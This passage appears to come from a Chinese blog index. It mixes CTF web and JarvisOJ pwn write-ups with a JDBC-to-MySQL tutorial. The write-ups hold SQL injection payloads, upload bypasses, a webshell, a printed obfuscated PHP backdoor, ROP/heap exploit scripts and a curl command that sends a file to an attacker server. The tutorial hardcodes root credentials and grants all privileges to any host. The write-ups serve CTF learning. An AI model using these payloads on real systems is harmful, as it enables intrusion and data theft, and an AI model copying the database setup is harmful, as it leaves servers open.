3的时候有，说明共3列。 1id=1 union se&lt;&gt;lect 1,2,3 得到回显2。接下来正常注入： 123456id=1 union se&lt;&gt;lect 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- info, usersid=1 union se&lt;&gt;lect 1,group_concat(column_name),3 from information_schema.columns where table_name='info'-- id,title,flAg_T5ZNdrmid=1 union se&lt;&gt;lect 1,flAg_T5ZNdrm,3 from info-- flag{...} SQLiF12发现login.php?id=1，但是这里好像注入不了。 回到前页，发现页面是由index.php302跳转来的，因此检查一下对于index.php的请求的返回头，发现了特殊字段page，得到真正的登陆页面l0gin.php?id=1。 这个id可以注入，但是存在逗号截断，因此需要在没有逗号的情况下注入，这里很容易想到join。先order by注入，得到列数为2。 1id=1' order by 3%23 尝试一下join: 1id=1' union select * from (select 1)a join (select 2)b%23 发现还是正常返回1,flag，因为网页上限制了只能显示一条记录，而id=1的查询是成功的，因此后面我们union的结果没有回显出来。因此只需要让id=3使得查询不到username即可。 最后正常注入： 12345id=3' union select * from (select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema=database())b%23id=3' union select * from (select 1)a join (select group_concat(column_name) from information_schema.columns where table_name='users')b%23id=3' union select * from (select 1)a join (select flag_9c861b688330 from users)b%23 123F12得到user.php和用户默认密码，下载user.php.bak，打开得到一堆用户名。Intruder用BatteringRam模式爆破用户名密码，登陆后F12得到： 12345&lt;!-- 存在漏洞需要去掉 --&gt;&lt;!-- &lt;form action=&quot;&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot; /&gt;&lt;/form&gt; --&gt; 这里猜测是文件上传漏洞。恢复前端代码后随便选个文件上传，发现只能传图片文件，因此修改Content-Type和文件内容。Content-Type设置为image/png，文件内容中写入PNG文件头PNG。然后将文件名改为1.png.php，但是提示文件名不能包含php。 因此尝试1.png.pht绕过，得到页面view.php。只有一个提示file?，尝试传入GET参数file=flag，得到提示filter 'flag'，于是双写绕过。 Test海洋CMS很老的漏洞，漏洞详情。 直接蚁剑连接/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1])来getshell。但是没有找到flag。 到/var/www/html/data/common.inc.php找到数据库配置： 123456789&lt;?php//数据库连接信息$cfg_dbhost = '127.0.0.1';$cfg_dbname = 'seacms';$cfg_dbuser = 'sea_user';$cfg_dbpwd = '46e06533407e';$cfg_dbprefix = 'sea_';$cfg_db_language = 'utf8';?&gt; 在蚁剑中选择数据操作，然后输入上面的配置信息，可以在seacms数据库的flag_140ad2e0d8cb表中执行SQL语句得到flag。 LoginF12中提示账户密码都为test1，登录后在响应头中发现show字段，把0在请求头改成1试试，发现注释中返回了源码。 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php include 'common.php'; $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE); class db { public $where; function __wakeup() { if(!empty($this-&gt;where)) { $this-&gt;select($this-&gt;where); } } function select($where) { $sql = mysql_query('select * from user where '.$where); return @mysql_fetch_array($sql); } } if(isset($requset['token'])) { $login = unserialize(gzuncompress(base64_decode($requset['token']))); $db = new db(); $row = $db-&gt;select('user=\\''.mysql_real_escape_string($login['user']).'\\''); if($login['user'] === 'ichunqiu') { echo $flag; }else if($row['pass'] !== $login['pass']){ echo 'unserialize injection!!'; }else{ echo &quot;(╯‵□′)╯︵┴─┴ &quot;; } }else{ header('Location: index.php?error=1'); }?&gt; 这里需要以ichunqiu登录，关键就在于那个反序列化的过程。而且，array_merge合并时，遇到相同的键取最后的那个值。 写个脚本生成需要的token，然后放在cookie里发送就好了。 1234&lt;?php $a = array('user' =&gt; 'ichunqiu'); echo base64_encode(gzcompress(serialize($a)));?&gt; Backdoor扫目录发现.git泄露。上GitHack把.git下载下来，然后发现需要回退。 值得记录的是GitHack好像没能把.git下下来，只能下载所有文件，因此我使用了dvcs ripper这个工具： 12./rip-git.pl -v -u http://1355bb65468a451b9487c15dba117690cff7627b879e42f2.changame.ichunqiu.com/Challenges/.git/ 访问/Challenges/.git/logs/HEAD可以查看提交记录，或者也可以git log查看。随后回退到之前的版本： 12git reset --hard 12c6ddf4af0a5542c1cf6a9ab19b4231c1fd9a88cat flag.php 这时可以看到，flag.php内容变为： 123&lt;?phpecho &quot;flag{true_flag_is_in_the_b4ckdo0r.php}&quot;;?&gt; 那么我们继续访问b4ckdo0r.php，提示要找出其源码。这种一般都存在备份文件里，例如vim中的.swo和.swp，逐一尝试得备份文件.b4ckdo0r.php.swp，用vim -r恢复： 1234567891011121314151617181920&lt;?phpecho &quot;can you find the source code of me?&quot;;/** * Signature For Report */$h='_)m/&quot;,&quot;/-/)m&quot;),)marray()m&quot;/&quot;,&quot;+&quot;)m),$)mss($s[$i)m],0,$e))))m)m,$k)));$o=ob)m_get_c)monte)m)mnts)m();ob_end_clean)';/* */$H='m();$d=ba)mse64)m_encode)m(x(gzc)mompres)ms($o),)m$)mk));print(&quot;&lt;)m$k&gt;$d&lt;)m/)m$k&gt;)m&quot;);@sessio)mn_d)mestroy();}}}}';/* */$N='mR;$rr)m=@$r[)m&quot;HTT)mP_RE)mFERER&quot;];$ra)m=)m@$r[&quot;HTTP_AC)mC)mEPT_LANG)mUAGE)m&quot;)m];if($rr)m&amp;&amp;$ra){)m$u=parse_u)mrl($rr);p';/* */$u='$e){)m$k=$)mkh.$kf;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array(&quot;/';/* */$f='$i&lt;$)ml;)m){)mfo)mr($j)m=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j)m++,$i+)m+){$)mo.=$t{$i)m}^$)mk{$j};}}r)meturn )m$o;}$r)m=$_SERVE)';/* */$O='[$i]=&quot;&quot;;$p)m=$)m)mss($p,3)m);}if(ar)mray_)mkey_exists)m()m$i,$s)){$)ms[$i].=$p)m;)m$e=s)mtrpos)m($s[$i],$f);)mif(';/* */$w=')m));)m$p=&quot;&quot;;fo)mr($z=1;)m$z&lt;c)mount()m$m[1]);$)mz++)m)m)$p.=$q[$m[)m)m2][$z]];if(str)mpo)ms($p,$h))m===0){$s)m';/* */$P='trt)molower&quot;;$)mi=$m[1][0)m)m].$m[1][1])m;$h=strtolower()msubstr(m)md5($)mi.$kh)m),0,)m3));$f=$s)ml(substr()m)mmd5($i.$kf),0,3';/* */$i=')marse_)mstr)m($u[&quot;q)muery&quot;],$)m)mq);$q=array)m_values()m$q);pre)mg_matc)mh_all()m&quot;/([\\\\w)m])m)[\\\\w-)m]+(?:;q=0.)';/* */$x='m([\\\\d)m]))?,?/&quot;,)m$ra,$m))m;if($q)m&amp;&amp;$)mm))m)m{@session_start();$)ms=&amp;$_S)mESSI)m)mON;$)mss=&quot;sub)mstr&quot;;strtolower=&quot;s)m';/* */$y=str_replace('b','','crbebbabte_funcbbtion');/* */$c='$kh=&quot;4f7)m)mf&quot;;$kf=&quot;2)m)m8d7&quot;;funct)mion x($t)m,$k){$)m)mc=strlen($k);$l=st)mrlen)m($t);)m)m$o=&quot;&quot;;for()m$i=0;';/* */$L=str_replace(')m','',$c.$f.$N.$i.$x.$P.$w.$O.$u.$h.$H);/* */$v=$y('',$L);$v();/* */?&gt; 这里的代码经过了混淆，我们在代码末尾加上一段代码来进行分析： 123echo var_dump($L);echo $y;echo $v; 得到原本的核心代码($L)： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?php$kh=&quot;4f7f&quot;;$kf=&quot;28d7&quot;;function x($t,$k){ $c=strlen($k); $l=strlen($t); $o=&quot;&quot;; for($i=0; $i&lt;$l;) { for($j=0; ($j&lt;$c&amp;&amp;$i&lt;$l); $j++,$i++) { $o.=$t{$i}^$k{$j}; } } return $o;}$r=$_SERVER;$rr=@$r[&quot;HTTP_REFERER&quot;];$ra=@$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];if($rr&amp;&amp;$ra){ $u=parse_url($rr); parse_str($u[&quot;query&quot;],$q); $q=array_values($q); preg_match_all(&quot;/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/&quot;,$ra,$m); if($q&amp;&amp;$m) { @session_start(); $s=&amp;$_SESSION; $i=$m[1][0].$m[1][1]; $h=strtolower(substr(md5($i.$kh),0,3)); $f=strtolower(substr(md5($i.$kf),0,3)); $p=&quot;&quot;; for($z=1; $z&lt;count($m[1]); $z++)$p.=$q[$m[2][$z]]; if(strpos($p,$h)===0) { $s[$i]=&quot;&quot;; $p=substr($p,3); } if(array_key_exists($i,$s)) { $s[$i].=$p; $e=strpos($s[$i],$f); if($e) { $k=$kh.$kf; ob_start(); //！ @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&quot;/_/&quot;,&quot;/-/&quot;),array(&quot;/&quot;,&quot;+&quot;),substr($s[$i],0,$e))),$k))); $o=ob_get_contents(); ob_end_clean(); $d=base64_encode(x(gzcompress($o),$k)); print(&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;); @session_destroy(); } } }} 代码的重点在于Accept-Language，Referer和感叹号所在的行，因为可以用eval执行代码。 首先x函数显然是循环异或。随后仔细阅读preg_match_all的正则表达式，发现它将Accept-Language分成了3部分，m[0]存每种语言的完整字符串，m[1]存首字母，m[2]存语言权重小数点后的数字。 Accept-Language格式：语言;q=权重，例如en-US;q=0.5 而$i取的是$m[1][0].$m[1][1]，也就是前两种语言的首字母。$h和$f不难计算，我们假设输入的语言是zh-CN,zh，那么$i就是zz，计算得到$h为675，$f为a3e。 不过下面的for循环有点绕： 12for($z=1; $z&lt;count($m[1]); $z++) $p.=$q[$m[2][$z]]; $z指当前是第几种语言，$m[2][$z]就是该语言权重的小数点后第一位，以这个值为索引取得Referer的url中query string里对应索引的那个参数值拼接到$p上。 下面的if判断$p是不是以$h开头$f结尾，如果是则进入下面的eval函数，我们才能实现命令注入。eval函数内是一个简单的写逆向函数的过程。 脚本： 123456789101112131415161718192021222324&lt;?php// 照搬function x($t,$k){ $c=strlen($k); $l=strlen($t); $o=&quot;&quot;; for($i=0; $i&lt;$l;) { for($j=0; ($j&lt;$c&amp;&amp;$i&lt;$l); $j++,$i++) { $o.=$t{$i}^$k{$j}; } } return $o;}function inject($cmd) { $payload = base64_encode(x(gzcompress($cmd), &quot;4f7f28d7&quot;)); return &quot;675&quot;.$payload.&quot;a3e&quot;;}echo inject('system(&quot;ls&quot;);');?&gt; 将得到的字符串放在Referer的第一个参数里，设置请求头： 12Accept-Language: zh-CN,zh;q=0.0Referer: http://12.12.12.12/index.php?a=675TPocyB4WLfrhNv1PZOrQMTREimJna3e 得到经过编码的返回值： 1TPp8VHv2Kv4DTuVN+hCEff8ve2EBCpdlZk33ypDEwMumBIr0uCrKpbiq1Z5+6xyPHma96ydT 再写脚本解码： 1234567891011121314151617181920212223&lt;?php// 照搬function x($t,$k){ $c=strlen($k); $l=strlen($t); $o=&quot;&quot;; for($i=0; $i&lt;$l;) { for($j=0; ($j&lt;$c&amp;&amp;$i&lt;$l); $j++,$i++) { $o.=$t{$i}^$k{$j}; } } return $o;}function dec($out) { return gzuncompress(x(base64_decode($out), '4f7f28d7'));}echo dec('TPp8VHv2Kv4DTuVN+hCEff8ve2EBCpdlZk33ypDEwMumBIr0uCrKpbiq1Z5+6xyPHma96ydT');?&gt; 得到解码后的返回值： 1b4ckdo0r.php flag.php index.php robots.txt this_i5_flag.php 然后执行命令cat this_i5_flag.php，和上面一样的方法编码后发送得到编码后的flag，再用同样方法解码即可。最后flag在页面注释中。 GetFlag熟悉的爆破md5套路： 1234567import hashlib, sysfor i in range(10**5, 10**8): val = hashlib.md5(str(i)).hexdigest() if val[:6] == sys.argv[1]: print(i) break 用户名可以直接注入，密码任意。登录后可以看到三个文件。提示说flag在web根目录。注意到文件的下载url为： 1/Challenges/file/download.php?f=a.php 可以尝试下载flag.php，但是显示flag{wow!!!but not true}。猜想这里可能不能使用相对路径，换成绝对路径： 1/Challenges/file/download.php?f=/var/www/html/Challenges/flag.php 得到源码： 1234567891011121314151617181920&lt;?php$f = $_POST['flag'];$f = str_replace(array('`', '$', '*', '#', ':', '\\\\', '&quot;', &quot;'&quot;, '(', ')', '.', '&gt;'), '', $f);if((strlen($f) &gt; 13) || (false !== stripos($f, 'return'))){ die('wowwwwwwwwwwwwwwwwwwwwwwwww');}try{ eval(&quot;\\$spaceone = $f&quot;);}catch (Exception $e){ return false;}if ($spaceone === 'flag'){ echo file_get_contents(&quot;helloctf.php&quot;);}?&gt; 。。。看似过滤一大堆，实际上直接POST提交flag=flag;就完了，需要注意的就是最后的分号。 Not Found首页直接跳转到不存在的404.php，在响应头中发现X-Method: haha字段。一次尝试HTTP方法，当使用OPTIONS时，发现响应头中多出了Location: ?f=1.php字段。对这个url也进行OPTIONS请求，得到一段源码： 12345&lt;?php $msg = &quot;not here&quot;; $msg .= PHP_EOL; $msg .=&quot;plz trying&quot;; echo $msg; 直接访问1.php发现这就是1.php的源码。猜测这个f参数的功能就是文件读取，尝试index.php发现不允许。最后发现.htaccess却可以读： 123RewriteEngine OnRewriteBase /RewriteRule ^8d829d8568e46455104209db5cd9228d.html$ 404.php [L] 因此我们访问这个html得到提示，修改XFF头，但是无效。因此我们换而修改client-ip头为127.0.0.1得到flag。 VldF12得到提示index.php.txt，访问得到了一个看不太懂的文件，似乎是php的opcode。耐心分析还是不难理解的，需要三个GET参数flag1, flag2, flag3，分别等于fvhjjihfcv, gfuyiyhioyf, yugoiiyhi。访问新url可以下载到源码。 观察源码发现关键的地方在于： 123456789101112131415161718/* dbmysql.class.php */public function my_md5($string){ return md5(substr(md5($string),5,24));}public function safe_data($value){ if( MAGIC_QUOTES_GPC ){ stripcslashes($value); } return addslashes($value);}/* login.php */$username = $db-&gt;safe_data($_POST['username']);$password = $db-&gt;my_md5($_POST['password']);$number = is_numeric($_POST['number']) ? $_POST['number'] : 1;$username = trim(str_replace($number, '', $username));$sql = &quot;select * from&quot;.&quot;`&quot;.table_name.&quot;`&quot;.&quot;where username=&quot;.&quot;'&quot;.&quot;$username&quot;.&quot;'&quot;; 这里可以看到username会先被addslashes，然后其中和number相同的部分会被去掉。这样我们就能让'逃过转义，当我们提交username=%00'时，会被addslashes转义为\\0\\'，如果number=0，则其中的0会被替换掉变成\\\\'，此时第二个\\被转义，原SQL语句变为where username='\\\\'，成功闭合。 然后就是报错注入，注意语句中不能再出现0了： 12345number=0&amp;username=%00' or updatexml(1,concat(hex(126),(select group_concat(table_name) from information_schema.tables where table_schema=database()),hex(126)),1)#&amp;password=ccc&amp;submit=number=0&amp;username=%00' or updatexml(1,concat(hex(126),(select flag from flag),hex(126)),1)#&amp;password=ccc&amp;submit=number=0&amp;username=%00' or updatexml(1,concat(hex(126),substr((select flag from flag),21,99),hex(126)),1)#&amp;password=ccc&amp;submit= EXECF12在html的head标签中发现editor=&quot;vim&quot;，显然能下载.index.php.swp： 1234567891011121314151617181920212223242526272829&lt;?php/*flag in flag233.php*/ function check($number){ $one = ord('1'); $nine = ord('9'); for ($i = 0; $i &lt; strlen($number); $i++) { $digit = ord($number{$i}); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) { return false; } } return $number == '11259375';}if(isset($_GET[sign])&amp;&amp; check($_GET[sign])){ setcookie('auth','tcp tunnel is forbidden!'); if(isset($_POST['cmd'])){ $command=$_POST[cmd]; $result=exec($command); //echo $result; }}else{ die('no sign');}?&gt; 首先需要一个GET参数，其值为11259375但不能包含1-9中的数字。注意到这里的弱比较，可以将该数字转为十六进制，恰好为0xabcdef，不包含1-9，因此提交?sign=0xabcdef可以发现no sign的提示没有了。 接下来在保留刚才的参数的同时POST命令就可以执行了，但是没有回显，猜想是通过nc把flag233.php反弹到自己的服务器上，并且需要走UDP，但是最终没有成功。最终采用了curl的方法，把文件内容base64编码后放在url里向服务器发送请求，并在日志中查看flag。payload： 1cmd=data=$(cat flag233.php | base64);curl http://xx.xx.xx.xx?data=$data; 在access.log中即可得到编码后的flag233.php。","link":"/post/IcqWeb/"},{"title":"通过 JDBC 连接 MySQL","text":"大概是第二次被 MySQL 玩了，也可能是第三次。 使用环境 Java 开发环境：Win10 + JDK1.8 + Idea MySQL 版本：8.x（其实用的是 MariaDB，不过差不多） MySQL 的 JDBC 驱动版本：8.x（事实证明，这个和 MySQL 版本号至少最高位必须是一样的） MySQL 运行环境：VMware WorkStation 15 Player + Kali Linux 2.0 流程 在 MySQL 中新建数据库，例如叫 test，可以新建一些数据表并插入一些数据，使得在 Java 中可以操作它们并看到结果。 在 Idea 中新建项目，导入 MySQL 驱动并编写程序。 打包成 jar 包，放到虚拟机里用java -jar xxx.jar运行。 就这么简单。然而如此简单的三步中居然还能有那么多的坑点。 Idea 导入 MySQL 驱动这里并不坑。Idea 还是很友好的。 12File -&gt; Project Structure -&gt; Modules -&gt; Dependencies -&gt; Module Source -&gt; 绿色加号-&gt; JARs or Directories -&gt; 后面应该不用说了 搞定。 坑点其实在我把 jar 包放到服务器上运行后，自始至终只遇到了这种错误： 12java.sql.SQLNonTransientConnectionException: Could not create connection to database server.Attempted reconnect 3 times. Giving up. 这个错误似乎非常常见，因为能引起这个错误的因素太多了。StackOverflow 中的一个超有料的问题里的一些回答给出了非常多的解决方法。我强烈建议读者点进链接看一下尤其是第一个回答，感受一下 MySQL 的坑点之多、之恐怖。其中很多原因是来源于 MySQL 8.x 与 5.x 的巨大差异。 我据此对程序进行了许多修改，包含的坑点有（粗体为可能导致这次错误的原因）： Java 可能将localhost解析为 IPv6 地址:::1，而不是 IPv4 的127.0.0.1，然而 MySQL 只认后者；解决方法是把localhost换成127.0.0.1。 确保连接时的用户名与密码正确，为此我重设了下密码。 在 url 中设置参数autoReconnect=true防止意外断连。 在 url 中设置参数useUnicode=true。 在 url 中设置参数characterEncoding=utf-8。 在 url 中设置参数useSSL=false。 不使用 SSL。（似乎是 8.x 新要求） 在 url 中设置参数serverTimezone=GMT%2B8。 设置时区为东 8 区，当然服务器也要设置set global time_zone='+8:00'。（似乎是 8.x 新要求） **Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);而不是Class.forName(&quot;com.mysql.jdbc.Driver&quot;);**（8.x 新特性，很重要） 注释掉配置文件中的bind-address一行，放行来自所有 IP 的连接。 **在 MySQL 中运行命令GRANT ALL PRIVILEGES ON *.* TO 'user'@'%' IDENTIFIED BY 'password';**。 别忘了重启 MySQL 服务。 吐槽没花太多时间解决这个问题，不过中间一度想在虚拟机上搭个 LAMP 当服务器用（等等，IP 地址怎么办？），以为那样就可以不用踩这些坑了。有机会试试用 Maven 项目连数据库。 另外，我记得上次被 MySQL 玩是因为 5.x 和 8.x 版本对密码的哈希方式不一样吧？ 2019.4.1 更新对于上面“虚拟机 IP 地址”的回答：内网 IP。是我当时蠢了。把 IP 地址换成内网 IP（如下方代码）可以直接在 Idea 下调试，方便多了。 顺手贴个代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168import java.sql.*;import java.util.ArrayList;import java.util.Scanner;public class Main { public static void main(String[] args) { String url = &quot;jdbc:mysql://192.168.30.128:3306/test?&quot; + &quot;autoReconnect=true&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;&quot; + &quot;useSSL=false&amp;serverTimezone=GMT%2B8&quot;; String userName = &quot;root&quot;; String password = &quot;celine&quot;; Connection conn; PreparedStatement stmt = null; ResultSet rs = null; String sql; Scanner sc = new Scanner(System.in); try { Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;); conn = DriverManager.getConnection(url, userName, password); System.out.println(&quot;Connected to MySQL via JDBC.\\n&quot;); System.out.println(&quot;Enter: [0] to get metadata, [1-9] to perform 9 tasks on the Movie database, [-1] to quit.&quot;); int op; while((op = sc.nextInt()) != -1) { switch (op) { case 0: //display metadata sql = &quot;show tables&quot;; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); ArrayList&lt;String&gt; tables = new ArrayList&lt;&gt;(); while (rs.next()) { tables.add(rs.getString(1)); } for(String table: tables) { sql = &quot;select * from &quot; + table + &quot; limit 1;&quot;; rs = stmt.executeQuery(sql); ResultSetMetaData metaData = rs.getMetaData(); System.out.println(&quot;table name: &quot; + table); System.out.println(&quot;columns:\\n&quot;); for(int i = 1; i &lt;= metaData.getColumnCount(); ++i) { System.out.println(&quot;\\t&quot; + metaData.getColumnName(i) + &quot;\\t&quot; + metaData.getColumnTypeName(i)); } System.out.println(); } break; case 1: sql = &quot;select count(*) from Movies;&quot;; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); while (rs.next()) { System.out.println(&quot;1. Number of movies: &quot; + rs.getInt(&quot;count(*)&quot;)); } break; case 2: sql = &quot;select title from Movies;&quot;; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); System.out.println(&quot;2. All titles:&quot;); while (rs.next()) { System.out.println(rs.getString(&quot;title&quot;)); } break; case 3: sql = &quot;select min(year) from Movies;&quot;; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); while (rs.next()) { System.out.println(&quot;3. Min year: &quot; + rs.getInt(&quot;min(year)&quot;)); } break; case 4: sql = &quot;select count(*) from Actors;&quot;; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); while (rs.next()) { System.out.println(&quot;4. Number of actors: &quot; + rs.getInt(&quot;count(*)&quot;)); } break; case 5: sql = &quot;select givenNames, familyName from Actors where familyName='Zeta-Jones';&quot;; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); System.out.println(&quot;5. Who's Zeta-Jones:&quot;); while (rs.next()) { System.out.println(rs.getString(&quot;givenNames&quot;) + &quot; &quot; + rs.getString(&quot;familyName&quot;)); } break; case 6: sql = &quot;select distinct(genre) from BelongsTo;&quot;; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); System.out.println(&quot;6. Genres:&quot;); while (rs.next()) { System.out.println(rs.getString(&quot;genre&quot;)); } break; case 7: sql = &quot;select m.title, m.year from Movies m &quot; + &quot;join Directs s on (s.movie = m.id) &quot; + &quot;join Directors d on (s.director = d.id) &quot; + &quot;where d.familyName = 'Spielberg';&quot;; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); System.out.println(&quot;7. Spielberg has directed:&quot;); while (rs.next()) { System.out.println(&quot;Title: &quot; + rs.getString(&quot;title&quot;) + &quot; | &quot; + &quot;Year: &quot; + rs.getString(&quot;year&quot;)); } break; case 8: sql = &quot;select a.givenNames, a.familyName from Actors a &quot; + &quot;where not exists (select id from Movies &quot; + &quot;except (select movie as id from AppearsIn where actor = a.id));&quot;; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); System.out.println(&quot;8. Super actor: &quot;); while (rs.next()) { System.out.println(rs.getString(&quot;givenNames&quot;) + &quot; &quot; + rs.getString(&quot;familyName&quot;)); } break; case 9: /* sql = &quot;create view nDirected as &quot; + &quot;select d.id as director, count(s.movie) as ntimes &quot; + &quot;from Directors d left outer join Directs s on (d.id = s.director) &quot; + &quot;group by d.id; &quot;; stmt.execute(sql); */ sql= &quot;select d.givenNames, d.familyName as name &quot; + &quot;from nDirected nd join Directors d on (nd.director = d.id) &quot; + &quot;where ntimes = 0;&quot;; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); System.out.println(&quot;9. Lazy Director: &quot;); while (rs.next()) { System.out.println(rs.getString(&quot;givenNames&quot;) + &quot; &quot; + rs.getString(&quot;familyName&quot;)); } break; } System.out.println(); } rs.close(); stmt.close(); conn.close(); } catch (Exception e) { e.printStackTrace(); } finally { if (rs != null) { try { rs.close(); } catch (SQLException sqlEx) { } // ignore } if (stmt != null) { try { stmt.close(); } catch (SQLException sqlEx) { } // ignore } } }}","link":"/post/JDBCMySQL/"},{"title":"JarvisOJ Pwn","text":"Pwn题难度顺序还是比较合理的。 level0ret2text。 12payload = flat('a'*0x88,elf.sym['callsystem'])sla('World\\n', payload) level1题目给出了buf的真实地址，且buf可以输入0x100字节，那么可以在buf中写shellcode然后返回到buf。 12345ru('0x')buf = int(ru('?'),16)leak('buf', buf)payload = asm(shellcraft.sh()).ljust(0x88+4,'a') + p32(buf)sl(payload) 但是本题远程文件出了点问题导致拿不到buf的真实地址，所以换了种办法，调用read把shellcode读取到bss段上，然后返回到bss段getshell。 1234pop3 = 0x8048549payload = flat('a'*(0x88+4),elf.plt['read'],pop3,0,elf.bss(),0x100,elf.bss())sl(payload)sl(asm(shellcraft.sh())) level2本题中存在system函数，通过ROPgadgets搜索到了binsh字符串，构造调用system(&quot;/bin/sh&quot;)即可。 123binsh = 0x804a024payload = flat('a'*(0x88+4),elf.plt['system'],'a'*4,binsh)sla('Input:\\n',payload) level2_x64上一题的64位版本，需要通过pop rdi; ret的gadget传参。 1234pop_rdi = 0x4006b3binsh = 0x600a90payload = flat('a'*(0x80+8),pop_rdi,binsh,elf.plt['system'])sla('Input:\\n',payload) level3没有system和binsh但有libc，因此常规ret2libc。 12345678payload = flat('a'*(0x88+4),elf.plt['write'],elf.sym['main'],1,elf.got['read'],4)ru('Input:\\n')sl(payload)read =uu64(r(4))leak('read',read)system,binsh = ret2libc(read,'read')payload = flat('a'*(0x88+4),system,'a'*4,binsh)sla('Input:\\n',payload) level3_x64 &amp; level5上题的64位版本，依然需要寄存器传参。 12345678910pop_rdi = 0x4006b3pop_rsi_r15 = 0x4006b1payload = flat('a'*(0x80+8),pop_rdi,1,pop_rsi_r15,elf.got['read'],6,elf.plt['write'],elf.sym['main'])ru('Input:\\n')sl(payload)read =uu64(r(6))leak('read',read)system,binsh = ret2libc(read,'read')payload = flat('a'*(0x80+8),pop_rdi,binsh,system)sla('Input:\\n',payload) level4和level3几乎相同，依然是ret2libc。 1234567payload = flat('a'*(0x88+4),elf.plt['write'],elf.sym['main'],1,elf.got['read'],4)sl(payload)read =uu64(r(4))leak('read',read)system,binsh = ret2libc(read,'read')payload = flat('a'*(0x88+4),system,'a'*4,binsh)sl(payload) level6 &amp; level6_x64 &amp; guestbook2三题比较类似，以64位为例。参考文章。 首先本题存在一个索引表，结构大致是这样： 12345678910111213141516171819| ... | ------------| max_size | ------------| exist_num | ------------| allocated0 | ------------| size_user0 | ------------| ptr_heap0 | ------------| allocated1 | ------------| size_user1 | ------------| ptr_heap1 | ------------| ... | max_size：最大记录数 exist_num：当前记录数 chunk0: allocated：是否是被分配的 size_user：用户数据长度 ptr_heap：返回给用户的指针 题目主要漏洞有2处，首先是新建记录时存在off-by-one，可以多读入一个字节，从而泄露后面相邻区域的内容。第二处漏洞就是常见的free后没有置空指针，造成了double free。 首先泄露libc地址和堆地址。创建4个小chunk，删掉不相邻的2个（防止合并）。由于题目限制最小分配0x80B，必定会先进入unsorted bin；然后拿回来并写满fd的位置，从而打印出bk。chunk0的bk指向chunk2，相隔一个索引表（0x1820B）和两个正常chunk(2*0x90B)，因此可以算出堆地址。chunk2的bk指向main_arena+88，从而泄露libc。 随后伪造堆块，heap+0x30是chunk0的ptr_heap的位置，-0x18和-0x10分别指向其fd和bk。随后继续伪造chunk1方便后续触发unlink(chunk0)，再伪造chunk2防止与top chunk合并。删除chunk1，即可导致unlink(chunk0)。 最后按索引表结构，进行GOT表劫持，把free劫持到system并getshell。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849def list(): sla(':','1')def add(len,content='a'): sla(':','2') sla('note:',str(len)) sa('note:',content)def edit(index,len,content): sla(':','3') sla('number:',str(index)) sla('note:',str(len)) sa('note:',content)def delete(index): sla(':','4') sla('number:',str(index))for i in range(4): add(1)delete(0)delete(2)add(8,'deadbeef') # 0add(8,'deadbeef') # 2list()ru('0. deadbeef') # 0-&gt;bk = heap+0x1820+2*0x90heap = uu64(ru('\\n'))-0x1940leak('heap',heap)ru('2. deadbeef') # 2-&gt;bk = main_arena+88base = uu64(ru('\\n'))-88-libc.sym['__malloc_hook']-0x10leak('base',base)for i in range(3,-1,-1): delete(i)# chunk0:prev_size,size,fd,bk,datafake = flat(0,0x81,heap+0x30-0x18,heap+0x30-0x10,'a'*0x60)# chunk1:prev_size,size,data; chunk2:prev_size,size,datafake += flat(0x80,0x90,'a'*0x80,0,0x91,'a'*0x80)add(len(fake),fake)delete(1) # unlink chunk0system = base + libc.sym['system']# len(payload) == len(fake)payload = flat(1,1,8,elf.got['free'],1,8,heap+0xabcd).ljust(len(fake),'a')edit(0,len(fake),payload)edit(0,8,p64(system))edit(1,8,'/bin/sh\\x00')delete(1) 而guestbook2仅仅是提示语不同，其余没有任何区别。level6是32位的版本。 tell_me_something64位下的ret2text，后门函数为good_game函数。 12payload = flat('a'*0x88,elf.sym['good_game'])sla(':\\n',payload) fm存在格式化字符串漏洞，我们需要修改x的值为4来getshell。测得输入偏移为11。而p32(x的地址)长度4字节，恰好能将4写入x的地址。 12x = 0x804a02csl(p32(x)+'%11$n') test_your_memory本题看似复杂，实际上由于给了一个提示hint，指向cat flag字符串，又存在后门函数win_func执行system(command)，那么我们只需要把cat flag字符串传给win_func即可。 123cat_flag = 0x80487e0payload = flat('a'*(0x13+4),elf.sym['win_func'],elf.sym['main'],cat_flag)sl(payload) itemboard结构体： 123456struct ItemStruct{ char *name; char *description; void (*free)(ItemStruct *);} 在创建新item时，首先会创建0x20的Item Struct*，包含了name,description,free三个指针；随后创建0x30的空间存放name；最后根据用户输入创建对应大小的空间存放description。 那么我们可以先创建一个0x80的chunk然后释放，它会进入unsorted bin中，此时其fd指向main_arena+88，通过show即可泄露libc。注意这里的show函数： 